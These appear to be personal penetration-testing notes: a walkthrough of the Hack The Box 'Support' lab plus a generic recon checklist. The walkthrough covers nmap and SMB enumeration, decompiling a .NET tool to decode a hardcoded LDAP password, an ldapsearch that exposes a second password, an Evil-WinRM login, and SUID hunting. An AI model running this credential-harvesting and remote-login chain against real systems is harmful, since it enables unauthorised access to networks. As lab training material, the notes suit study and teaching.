- ping machine
	- `ping ###.###.###.###`
```bash


```
- nmap for open ports
	- `nmap -p- -T4 --open -Pn -vvv ###.###.###.### -oN nameNmap.txt`
	- or ''
```bash
kali@kali  ~/htb  nmap -p- -T4 --open -Pn -vvv 10.10.11.174 -oN supportNmap.t
xt                                                                              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-13 14:28 EDT                 
Initiating Parallel DNS resolution of 1 host. at 14:28                          
Completed Parallel DNS resolution of 1 host. at 14:28, 0.15s elapsed            
DNS resolution of 1 IPs took 0.15s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 
0, TR: 1, CN: 0]                                                                
Initiating SYN Stealth Scan at 14:28                                            
Scanning 10.10.11.174 [65535 ports]                                             
Discovered open port 53/tcp on 10.10.11.174                                     
Discovered open port 135/tcp on 10.10.11.174                                    
Discovered open port 445/tcp on 10.10.11.174                                    
Discovered open port 139/tcp on 10.10.11.174                                    
Discovered open port 88/tcp on 10.10.11.174                                     
SYN Stealth Scan Timing: About 13.87% done; ETC: 14:32 (0:03:12 remaining)      
Discovered open port 49674/tcp on 10.10.11.174                                  
Discovered open port 49678/tcp on 10.10.11.174                                  
Discovered open port 9389/tcp on 10.10.11.174                                   
SYN Stealth Scan Timing: About 48.83% done; ETC: 14:30 (0:01:04 remaining)      
Discovered open port 5985/tcp on 10.10.11.174                                   
Discovered open port 636/tcp on 10.10.11.174                                    
Discovered open port 49699/tcp on 10.10.11.174                                  
Discovered open port 464/tcp on 10.10.11.174                                    
Discovered open port 49664/tcp on 10.10.11.174                                  
Discovered open port 49668/tcp on 10.10.11.174                                  
Discovered open port 593/tcp on 10.10.11.174                                    
Discovered open port 3269/tcp on 10.10.11.174                                   
Discovered open port 49733/tcp on 10.10.11.174                                  
Discovered open port 389/tcp on 10.10.11.174                                    
Discovered open port 3268/tcp on 10.10.11.174                                   
Completed SYN Stealth Scan at 14:30, 94.89s elapsed (65535 total ports)         
Nmap scan report for 10.10.11.174                                               
Host is up, received user-set (0.056s latency).                                 
Scanned at 2025-04-13 14:28:45 EDT for 95s                                      
Not shown: 65516 filtered tcp ports (no-response)  
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49678/tcp open  unknown          syn-ack ttl 127
49699/tcp open  unknown          syn-ack ttl 127
49733/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 95.12 seconds
           Raw packets sent: 131113 (5.769MB) | Rcvd: 81 (3.564KB)
```

- nmap for services and versions running on open ports
	- `nmap -p port#, port#, port# -sC -sV ###.###.###.### -oN nameServicesVersionsNmap` 
```bash
 kali@kali  ~/htb  nmap -p 53,88,135,139,445,464,593,636,3268,3269,5985,9389,4
9664,49668,49674,49678, 49699,49733 -sC -sV 10.10.11.174 -oN supportServicesVers
ionsNmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-13 14:39 EDT
Failed to resolve "49699,49733".
Nmap scan report for 10.10.11.174
Host is up (0.14s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-13 18:39:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-13T18:40:18
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.20 seconds

```
- noticing that the box appears to be running dns, kerberos, ldap we enumerate the DNS servers to confirm the servers name. 
```bash
 ✘ kali@kali  ~/htb/support  dig @10.10.11.174 +short support.htb any
10.10.11.174
dc.support.htb.
dc.support.htb. hostmaster.support.htb. 107 900 600 86400 3600
```


- smb found running on port 139, 445
- using smbclient to enumerate list shares `-L` 
```bash
 ✘ kali@kali  ~/htb  smbclient -L 10.10.11.174
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- tried to log on to each share - only netlogon, support-tools available 
	- pulling down all the files reveals there is a folder and files UserInfo.zip
		- Within UserInfo.zip there is a UserInfo.exe, UserInfo.exe.config
		- viewing the UserInfo.exe.config we note that it is running on .NETFramework,Version=v4.8
```bash
 kali@kali  ~/htb/support  cat UserInfo.exe.config 
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.8" />
    </startup>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Runtime.CompilerServices.Unsafe" publicKeyToken="b0
3f5f7f11d50a3a" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-6.0.0.0" newVersion="6.0.0.0" />
      </dependentAssembly>
    </assemblyBinding> 
  </runtime>
</configuration>%     

```
- running the executable - the file appears to be a way to query an ldap database for credentials
```bash
 kali@kali  ~/htb/support  ./UserInfo.exe 

Usage: UserInfo.exe [options] [commands]

Options: 
  -v|--verbose        Verbose output                                    

Commands: 
  find                Find a user                                       
  user                Get information about a user                      

 kali@kali  ~/htb/support  ./UserInfo.exe -v find -first YourMom
[*] LDAP query to use: (givenName=YourMom)
[-] Exception: No Such Object

```
- We can decompile the file to understand how it works with AvaloniaILSpy
	- https://github.com/icsharpcode/AvaloniaILSpy?tab=readme-ov-file
	- `Protected` class has an encoded password, username and getPassword()
	![[Pasted image 20250503125655.png]]
```bash
using System;
using System.Text;

internal class Protected
{
	private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

	private static byte[] key = Encoding.ASCII.GetBytes("armando");

	public static string getPassword()
	{
		byte[] array = Convert.FromBase64String(enc_password);
		byte[] array2 = array;
		for (int i = 0; i < array.Length; i++)
		{
			array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
		}
		return Encoding.Default.GetString(array2);
	}
}
```
- using https://dotnetfiddle.net/ to run the code to decode the password
	- ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
![[Pasted image 20250503131347.png]]
```bash
using System;
using System.Text;

internal class Protected
{
	private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

	private static byte[] key = Encoding.ASCII.GetBytes("armando");

	public static string getPassword()
	{
		byte[] array = Convert.FromBase64String(enc_password);
		byte[] array2 = array;
		for (int i = 0; i < array.Length; i++)
		{
			array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
		}
		return Encoding.Default.GetString(array2);
	}
}					
public class Program
{
	public static void Main()
	{
		Console.WriteLine(Protected.getPassword());
	}
	
	
}
```

- Now that we have credentials we should use them to run enum4linux to enumerate the box further.
```bash
 =======================================( Users on 10.10.11.174 )=======================================                                            
index: 0xeda RID: 0x1f4 acb: 0x00000010 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain        
index: 0xf70 RID: 0x455 acb: 0x00000210 Account: anderson.damian        Name: (null)    Desc: (null)                                                
index: 0xfbb RID: 0x459 acb: 0x00000210 Account: bardot.mary    Name: (null)    Desc: (null)                                                        
index: 0xfbc RID: 0x45a acb: 0x00000210 Account: cromwell.gerard        Name: (null)    Desc: (null)                                                
index: 0xfc0 RID: 0x45e acb: 0x00000210 Account: daughtler.mabel        Name: (null)    Desc: (null)                                                
index: 0xfc2 RID: 0x460 acb: 0x00000210 Account: ford.victoria  Name: (null)    Desc: (null)                                                        
index: 0xedb RID: 0x1f5 acb: 0x00000214 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain              
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: hernandez.stanley      Name: (null)    Desc: (null)                                                
index: 0xf10 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account                               
index: 0xfbf RID: 0x45d acb: 0x00000210 Account: langley.lucy   Name: (null)    Desc: (null)                                                        
index: 0xf6b RID: 0x450 acb: 0x00000210 Account: ldap   Name: (null)    Desc: (null)                                                                
index: 0xfb9 RID: 0x457 acb: 0x00000210 Account: levine.leopoldo        Name: (null)    Desc: (null)                                                
index: 0xfbd RID: 0x45b acb: 0x00000210 Account: monroe.david   Name: (null)    Desc: (null)                                                        
index: 0xfba RID: 0x458 acb: 0x00000210 Account: raven.clifton  Name: (null)    Desc: (null)                                                        
index: 0xf6d RID: 0x452 acb: 0x00000210 Account: smith.rosario  Name: (null)    Desc: (null)                                                        
index: 0xfc1 RID: 0x45f acb: 0x00000210 Account: stoll.rachelle Name: (null)    Desc: (null)                                                        
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: support        Name: (null)    Desc: (null)                                                        
index: 0xf71 RID: 0x456 acb: 0x00000210 Account: thomas.raphael Name: (null)    Desc: (null)                                                        
index: 0xfbe RID: 0x45c acb: 0x00000210 Account: west.laura     Name: (null)    Desc: (null)                                                        
index: 0xf6f RID: 0x454 acb: 0x00000210 Account: wilson.shelby  Name: (null)    Desc: (null)  

user:[Administrator] rid:[0x1f4]                                                                                                                    
user:[Guest] rid:[0x1f5]                                                                                                                            
user:[krbtgt] rid:[0x1f6]                                                                                                                           
user:[ldap] rid:[0x450]                                                                                                                             
user:[support] rid:[0x451]                                                                                                                          
user:[smith.rosario] rid:[0x452]                                                                                                                    
user:[hernandez.stanley] rid:[0x453]                                      
user:[wilson.shelby] rid:[0x454]                                          
user:[anderson.damian] rid:[0x455]                                        
user:[thomas.raphael] rid:[0x456]                                         
user:[levine.leopoldo] rid:[0x457]                                        
user:[raven.clifton] rid:[0x458]                                          
user:[bardot.mary] rid:[0x459]                                            
user:[cromwell.gerard] rid:[0x45a]                                        
user:[monroe.david] rid:[0x45b]                                           
user:[west.laura] rid:[0x45c]                                             
user:[langley.lucy] rid:[0x45d]                                           
user:[daughtler.mabel] rid:[0x45e]                                        
user:[stoll.rachelle] rid:[0x45f]                                         
user:[ford.victoria] rid:[0x460]              
```
- Further enumeration of the users reveals password in support user info
	- `ldapsearch -x -H ldap://support.htb -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(sAMAccountName=support)"`
	- info: Ironside47pleasure40Watchful
```bash
 kali@kali  ~/htb/support  ldapsearch -x -H ldap://support.htb -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=h
tb" "(sAMAccountName=support)"                                                                                                                      
# extended LDIF                                                                                                                                     
#                                                                                                                                                   
# LDAPv3                                                                                                                                            
# base <dc=support,dc=htb> with scope subtree                                                                                                       
# filter: (sAMAccountName=support)                                                                                                                  
# requesting: ALL                                                                                                                                   
#                                                                                                                                                   
# support, Users, support.htb                                                                                                                       
dn: CN=support,CN=Users,DC=support,DC=htb                                                                                                           
objectClass: top                                                                                                                                    
objectClass: person                                                                                                                                 
objectClass: organizationalPerson                                                                                                                   
objectClass: user                                                                                                                                   
cn: support                                                                                                                                         
c: US                                                                                                                                               
l: Chapel Hill                                                                                                                                      
st: NC                                                                                                                                              
postalCode: 27514                                                                                                                                   
distinguishedName: CN=support,CN=Users,DC=support,DC=htb                                                                                            
instanceType: 4                                                                                                                                     
whenCreated: 20220528111200.0Z                                                                                                                      
whenChanged: 20250503030142.0Z                                                                                                                      
uSNCreated: 12617                                                                                                                                   
info: Ironside47pleasure40Watchful  
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 86115
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133907149028701269

# search reference
ref: ldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb

# search reference
ref: ldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb

# search reference
ref: ldap://support.htb/CN=Configuration,DC=support,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3

```

- now that we have credentials to support we can use Evil-WinRM to logon to the box
	- support:Ironside47pleasure40Watchful
```bash
 ✘ kali@kali  ~/htb/support  evil-winrm -i 10.10.11.174 -u support
Enter Password: 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\support\Documents> 

```


- Gobuster to enumerate website if machine has 80 or 443
	- `gobuster dir -u http://precious.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -o nameGobuster.txt -t 10`
```bash

```
- -or-
- ffuf to enumerate website if machine has 80 or 443
	- ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.10/FUZZ -e .php,.txt -t 10
	- ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.10/FUZZ
	- wordlist 3 millipon
```bash

```

- search for exploits, RCEs, etc on service's versions running on those open ports
	- SearchSploit
	- Metaspolit
	- document

- Foothold - Look around and check things out for a second
	- search local directory
	- search root directory
	- sudo -l
	- look for exploitable binary's
		- `$ find / -perm /4000 2>/dev/null'
		- 

